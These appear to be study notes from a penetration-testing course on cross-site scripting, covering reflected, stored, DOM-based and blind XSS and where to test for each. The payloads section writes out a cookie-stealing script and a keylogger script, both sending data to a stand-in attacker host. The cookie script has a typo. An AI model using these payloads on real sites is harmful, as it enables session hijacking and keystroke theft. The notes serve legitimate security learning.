---
description: Eighth section in Jr Penetration Tester learning path.
---

# XSS (Cross-site Scripting)

### XSS Payloads

In XSS, the payload is the JavaScript which is executed on the targets computer, there are two parts to the payload: the intention and the modification. The intention is what you want the JavaScript to do, and the modification is the changes we need to make so it executes.

The simplest proof of concept (POC) payload will cause an alert box to pop up on the page with text, for example: `<script>alert('XSS');</script>`.

This payload would take the targets cookies, base64 encode them, and then post them to a website controlled by the attacker: `<script>fetch('https://example.com/steal?cookie=' + bota(document.cookie));</script>`.

This payload would create a keylogger on the target and forward any keystrokes to a website controlled by the attacker: `<script>document.onkeypress = function(e) { fetch('https://example.com/log?key=' + btoa(e.key) );}</script>`.

### Reflected XSS

This occurs when user supplied data in a HTTP request is included in the webpage source with no validation. This allows an attacker to send links or embed them into an iframe on a website containing a JavaScript payload. To test for this, look for:

* Parameters in the URL query string
* URL file path
* Sometimes HTTP headers (unlikely exploitable in practice)

### Stored XSS

The XSS payload is stored on the web application and gets run when other users visit the site or web page. This could redirect users, or steal a user's session cookies. To test for this, look for points where data is stored and then shown back in areas other users have access to:

* Comments on a blog
* User profile info
* Website listings

### DOM Based XSS

DOM (Document Object Model) is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. DOM based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to back-end code. DOM based XSS is hard to look for and requires knowledge of JavaScript to read the source code. You would look for parts of the code that access variables an attacker can have control over like "window.location.x".

### Blind XSS

Similar to stored XSS but you can't see the payload working or test it against yourself first. With the correct payload, an attacker can call back to their own site, revealing portal URLs, cookies or even page contents. To test for blind XSS you need to ensure your payload has a callback, so you know the code is being executed.
